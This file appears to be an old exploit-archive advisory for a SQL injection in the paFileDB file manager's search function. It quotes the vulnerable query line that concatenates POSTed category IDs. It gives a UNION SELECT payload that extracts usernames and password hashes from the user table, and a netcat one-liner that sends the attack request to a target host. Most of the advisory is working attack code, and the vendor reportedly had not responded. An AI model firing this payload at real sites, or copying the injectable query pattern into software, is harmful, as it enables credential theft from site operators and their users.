@@ -1,0 +1,21 @@
+Site: http://www.phparena.net/pafiledb
+Description: SQL injection (categories) in includes/search.php
+Code: $results = $db->GetArray("SELECT * FROM ".$dbPrefix."files WHERE (".$searchin.") AND file_catid IN (".implode(',',$_POST['categories']).")");
+
+Comment:"ouuch"
+
+SQL: ) UNION SELECT ALL null,user_username,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM (pafiledb_users
+
+POC:
+host="www.example.com"; echo -e "POST
+http://$host/index.php?act=search&process HTTP/1.1\nHost:
+$host\nContent-Length:
+302\n\nquery=test&search_in[]=file_name&search_in[]=file_desc&search_in[]=file_longdesc&search_in[]=file_creator&search_in[]=file_version&categories[]=1)
+UNION SELECT ALL
+null,user_username,user_password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null
+FROM (pafiledb_users"| netcat $host 80
+
+Vendor: was informed, but did not response yet...
+credits: h4si & pUm
+
+# milw0rm.com [2007-07-14]
